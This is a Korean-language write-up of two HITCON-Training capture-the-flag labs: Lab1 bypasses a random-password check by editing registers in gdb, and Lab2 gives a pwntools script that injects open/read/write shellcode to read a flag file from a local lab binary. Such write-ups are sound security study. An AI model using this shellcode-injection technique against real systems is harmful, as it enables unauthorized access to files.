# HITCON-Training
## Lab1-sysmagic
32bit 프로그램이 열리지가 않아서 고생했다.
sudo-apt로 몇가지를 깔고 나니 해결되었다. 
문제는 상당히 간단한 편이었다. 
~~~c
#include <stdio.h>
#include <unistd.h>



void get_flag(){
	int fd ;
	int password;
	int magic ;
	char key[] = "Do_you_know_why_my_teammate_Orange_is_so_angry???";
	char cipher[] = {7, 59, 25, 2, 11, 16, 61, 30, 9, 8, 18, 45, 40, 89, 10, 0, 30, 22, 0, 4, 85, 22, 8, 31, 7, 1, 9, 0, 126, 28, 62, 10, 30, 11, 107, 4, 66, 60, 44, 91, 49, 85, 2, 30, 33, 16, 76, 30, 66};
	fd = open("/dev/urandom",0);
	read(fd,&password,4);
	printf("Give me maigc :");
	scanf("%d",&magic);
	if(password == magic){
		for(int i = 0 ; i < sizeof(cipher) ; i++){
			printf("%c",cipher[i]^key[i]);
		}
	}
}


int main(){
	setvbuf(stdout,0,2,0);
	get_flag();
	return 0 ;
}
~~~
위와 같은 코드를 확인가능했다. cmp 주소를 확인해봐야 할 거 같아서 gdb를 켰다.
~~~
   0x0804870d <+370>:	push   0x804884d
   0x08048712 <+375>:	call   0x8048480 <__isoc99_scanf@plt>
   0x08048717 <+380>:	add    esp,0x10
   0x0804871a <+383>:	mov    edx,DWORD PTR [ebp-0x80]
   0x0804871d <+386>:	mov    eax,DWORD PTR [ebp-0x7c]
   0x08048720 <+389>:	cmp    edx,eax
   0x08048722 <+391>:	jne    0x8048760 <get_flag+453>
   0x08048724 <+393>:	mov    DWORD PTR [ebp-0x78],0x0
   0x0804872b <+400>:	jmp    0x8048758 <get_flag+445>
   0x0804872d <+402>:	lea    edx,[ebp-0x6f]
   0x08048730 <+405>:	mov    eax,DWORD PTR [ebp-0x78]
~~~
389번째 줄에서 cmp가 일어나는 것을 알 수 있었고 break *get_flag+389를 해주었다. 프로그램을 한번 돌려준 후 
~~~pwndbg
*EAX  0x170c6ecd
 EBX  0x0
 ECX  0x1
 EDX  0x170c6ecd
 EDI  0x0
 ESI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d6c
 EBP  0xffffd148 —▸ 0xffffd158 ◂— 0x0
 ESP  0xffffd0c0 —▸ 0x804a020 (_GLOBAL_OFFSET_TABLE_+32) —▸ 0xf7e472b0 (setvbuf) ◂— push   ebp
 EIP  0x8048720 (get_flag+389) ◂— cmp    edx, eax
~~~
set eax를 edx의 값으로 설정했더니 
*CTF{debugger_1s_so_p0werful_1n_dyn4m1c_4n4lySis!}*
를 확인가능했다.
프로그램이 안 열려서 애먹은 거에 비해 간단한 문제였다
## Lab2-orw
이 문제는 서버가 닫혀 있어서 방법론만 공부하였다. 
~~~
Give my your shellcode:
~~~
프로그램을 실행하니 위와 같이 반응했다. 그리고 pwntool을 통해 짜놓은 exploit code를 hitcon-training git에서 확인했다. shell을 짜려고 하는데 shellcraft라는 방식을 사용해 보았다.
~~~Dump of assembler code for function main:
   0x08048548 <+0>:	lea    ecx,[esp+0x4]
   0x0804854c <+4>:	and    esp,0xfffffff0
   0x0804854f <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048552 <+10>:	push   ebp
   0x08048553 <+11>:	mov    ebp,esp
   0x08048555 <+13>:	push   ecx
   0x08048556 <+14>:	sub    esp,0x4
   0x08048559 <+17>:	call   0x80484cb <orw_seccomp>
   0x0804855e <+22>:	sub    esp,0xc
   0x08048561 <+25>:	push   0x80486a0
   0x08048566 <+30>:	call   0x8048380 <printf@plt>
   0x0804856b <+35>:	add    esp,0x10
   0x0804856e <+38>:	sub    esp,0x4
   0x08048571 <+41>:	push   0xc8
   0x08048576 <+46>:	push   0x804a060
   0x0804857b <+51>:	push   0x0
   0x0804857d <+53>:	call   0x8048370 <read@plt>
   0x08048582 <+58>:	add    esp,0x10
   0x08048585 <+61>:	mov    eax,0x804a060
   0x0804858a <+66>:	call   eax
   0x0804858c <+68>:	mov    eax,0x0
   0x08048591 <+73>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048594 <+76>:	leave  
   0x08048595 <+77>:	lea    esp,[ecx-0x4]
   0x08048598 <+80>:	ret    
~~~
위는 dissasemble main의 결과이다. 
~~~python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
r=process("orw.bin")
pay=""
pay+=asm(shellcraft.open("./lab2flag.txt"))
pay+=asm(shellcraft.read("eax","esp",100))
pay+=asm(shellcraft.write(1,"esp",100))
r.recvuntil("shellcode:")
r.sendline(pay)
r.interactive()
~~~
flag.txt에 flag가 들어있을 것을 가정했다.(정보가 없어서 다른 wirteup을 참고했다). shellcraft.open에서는 flag.txt에서 flag를 가져온다고 가정하였다. eax에서 받은 100byte 즉 flag 부분을 esp에 저장시킨 후 다시 100byte만큼 write하도록 payload를 작성했다. 문제의 원형태를 몰라 writeup를 참고했으나 이 역시 어려운 문제는 아닌 듯하다. 
